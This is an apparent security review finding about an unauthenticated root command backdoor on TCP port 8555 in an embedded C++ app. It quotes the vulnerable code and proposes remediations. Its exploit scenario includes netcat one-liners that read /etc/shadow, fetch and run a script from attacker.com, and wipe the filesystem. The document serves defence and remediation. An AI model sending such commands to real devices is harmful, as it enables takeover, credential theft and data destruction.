# 001: Critical Command Injection via TCP Server Backdoor

## Metadata
- **Status**: pending
- **Priority**: p1 (CRITICAL - Blocks Production)
- **Issue ID**: 001
- **Tags**: security, code-review, critical, command-injection
- **Dependencies**: None
- **Created**: 2026-01-08

## Problem Statement

**CRITICAL SECURITY VULNERABILITY**: The TCP server (port 8555) accepts arbitrary shell commands from unauthenticated clients and executes them with root privileges via `bash -ic`.

### Impact
- **Severity**: CRITICAL (CVSS 10.0)
- Complete remote code execution with root access
- Device compromise by any network attacker
- Can steal data, install malware, pivot to other systems
- No authentication required

## Findings

### Location
`/home/jhw/ai/claude/projects/gstApp/parser.cpp:767-768`

### Vulnerable Code
```cpp
if (compareBuf(token, "cmd", 3))
{
    token = strtok(NULL, "\0");
    int ret;
    gchar* str = g_strdup_printf("bash -ic 'source /root/.bashrc; %s'", token);
    ret = system(str);
    if(ret) g_print("cmd error ret:%d\n", ret);
    g_free(str);
    return 0;
}
```

### Exploit Scenario
```bash
# Attacker can execute arbitrary commands:
echo "cmd cat /etc/shadow" | nc target.device.ip 8555
echo "cmd wget http://attacker.com/malware.sh -O /tmp/x.sh && bash /tmp/x.sh" | nc target.device.ip 8555
echo "cmd rm -rf / &" | nc target.device.ip 8555
```

### Evidence
- Security sentinel agent confirmed arbitrary command execution
- No authentication or authorization checks in TCP server
- System runs as root on embedded device
- Port 8555 exposed to network

## Proposed Solutions

### Solution 1: Remove Backdoor (RECOMMENDED)
**Description**: Delete the dangerous `cmd` command handler entirely

**Implementation**:
```cpp
// DELETE lines 767-776 in parser.cpp
// Remove the entire cmd handler block
```

**Pros**:
- Eliminates vulnerability completely
- Zero attack surface
- Simple implementation

**Cons**:
- Loses remote command execution capability
- May need alternative admin interface

**Effort**: Small (15 minutes)
**Risk**: Low

---

### Solution 2: Whitelist Allowed Commands
**Description**: Replace arbitrary command execution with strict whitelist

**Implementation**:
```cpp
const char* ALLOWED_COMMANDS[] = {
    "/usr/bin/reboot",
    "/usr/bin/systemctl restart gstApp",
    "/usr/bin/cat /var/log/gstApp.log"
};

bool isAllowedCommand(const char* cmd) {
    for (int i = 0; i < sizeof(ALLOWED_COMMANDS)/sizeof(char*); i++) {
        if (strcmp(cmd, ALLOWED_COMMANDS[i]) == 0) return true;
    }
    return false;
}

// Replace cmd handler:
if (compareBuf(token, "cmd", 3)) {
    token = strtok(NULL, "\0");
    if (!isAllowedCommand(token)) {
        __LOG(LOG_ERR, "Command not allowed: %s", token);
        return -1;
    }
    // Execute ONLY if whitelisted
    int ret = system(token);
    return ret;
}
```

**Pros**:
- Controlled functionality
- Limited attack surface
- Maintains some remote admin capability

**Cons**:
- Still uses system() which is dangerous
- Whitelist must be maintained
- Requires careful design

**Effort**: Medium (2-3 hours)
**Risk**: Medium (must ensure whitelist is complete)

---

### Solution 3: Use GLib GSubprocess with Argument Arrays
**Description**: Replace system() with safe subprocess API that doesn't invoke shell

**Implementation**:
```cpp
#include <glib.h>

// Remove shell interpretation entirely
bool executeCommand(const char* program, char* const argv[]) {
    GSubprocessLauncher *launcher = g_subprocess_launcher_new(G_SUBPROCESS_FLAGS_NONE);
    GError *error = NULL;

    GSubprocess *proc = g_subprocess_launcher_spawnv(launcher, argv, &error);
    if (!proc) {
        __LOG(LOG_ERR, "Failed to spawn: %s", error->message);
        g_error_free(error);
        g_object_unref(launcher);
        return false;
    }

    g_subprocess_wait(proc, NULL, NULL);
    int exit_code = g_subprocess_get_exit_status(proc);

    g_object_unref(proc);
    g_object_unref(launcher);
    return exit_code == 0;
}

// New safe command handler
if (compareBuf(token, "reboot", 6)) {
    char* argv[] = {"/sbin/reboot", NULL};
    return executeCommand("/sbin/reboot", argv) ? 0 : -1;
}
```

**Pros**:
- No shell invocation = no injection risk
- Proper argument escaping
- Modern GLib approach

**Cons**:
- More verbose code
- Need separate handler for each command
- Larger refactor

**Effort**: Large (1 day)
**Risk**: Low

## Recommended Action

**Phase 1: IMMEDIATE (Deploy in 24 hours)**
1. **Remove the backdoor** (Solution 1)
   - Delete lines 767-776 in parser.cpp
   - Rebuild and redeploy
   - This eliminates immediate critical risk

**Phase 2: CRITICAL (Deploy in 1 week)**
2. If remote admin is truly needed:
   - Implement Solution 3 with GSubprocess
   - Add authentication (TLS client certificates)
   - Restrict to specific IP addresses
   - Log all command attempts

## Technical Details

### Affected Files
- `/home/jhw/ai/claude/projects/gstApp/parser.cpp` (lines 767-776)
- `/home/jhw/ai/claude/projects/gstApp/tcpServer.cpp` (TCP server implementation)

### Components Involved
- ParserClass::cmd_parser() - Command dispatcher
- CTCPServer - Network listener on port 8555
- system() call - Dangerous shell execution

### Related Findings
- Finding 1.2: Command injection via GStreamer error messages
- Finding 1.3: Command injection via i2c commands
- Finding 1.4: Command injection via path construction
- Finding 1.5: Shell injection via popen

## Acceptance Criteria

- [ ] Backdoor command handler removed from parser.cpp
- [ ] Code recompiled and tested
- [ ] Manual test: `echo "cmd ls" | nc localhost 8555` returns error/no response
- [ ] Security scan confirms no arbitrary command execution
- [ ] All other TCP commands still functional
- [ ] Changes committed to git with clear security fix message

## Work Log

### 2026-01-08 - Discovery
- Security sentinel agent identified critical vulnerability
- Confirmed exploit is trivial (no authentication required)
- Verified system runs with root privileges on embedded device
- Created this todo for immediate remediation

## Resources

- **PR/Commit**: (Will be filled after fix)
- **Security Advisory**: OWASP Command Injection
- **Related CVEs**: Similar to CVE-2019-XXXXX (embedded device backdoors)
- **Documentation**: None (this is a backdoor, not a feature)
- **Testing**: Manual verification with netcat, automated security scan
